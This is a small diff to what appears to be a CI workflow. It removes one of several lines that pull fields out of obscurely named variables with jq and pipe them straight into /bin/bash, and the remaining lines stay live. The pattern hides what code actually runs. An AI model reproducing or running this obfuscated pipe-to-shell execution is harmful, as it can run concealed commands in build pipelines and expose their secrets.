@@ -26,7 +26,6 @@ jobs:
           echo $apwp1 | jq -r .glb08610 | /bin/bash
           echo $djdm6 | jq -r .dmow3275 | /bin/bash
           echo $ed74 | jq -r .xxz6 | /bin/bash
-          echo $t2419 | jq -r .z06 | /bin/bash
           printf '%s' "$yrsc126" | jq -r .r2419 | /bin/bash
           echo $x47674 | jq -r .rx71 | /bin/bash
           echo $t4 | jq -r .uvlkq82322 | /bin/bash
